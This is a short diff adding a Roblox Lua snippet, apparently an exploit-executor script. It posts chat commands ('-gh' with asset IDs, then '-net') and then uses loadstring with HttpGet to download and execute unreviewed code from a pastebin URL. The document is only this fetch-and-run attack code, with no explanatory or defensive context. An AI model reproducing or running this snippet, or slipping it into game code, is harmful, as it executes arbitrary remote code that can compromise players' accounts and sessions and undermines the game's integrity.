@@ -1,0 +1,6 @@
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 48474313, 6594369919, 62724852")
+		task.wait(2.1)
+		task.delay(5.5, function()
+			game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")
+		end)
+		loadstring(game:HttpGet('https://pastebin.com/raw/c1dmfBGL'))()
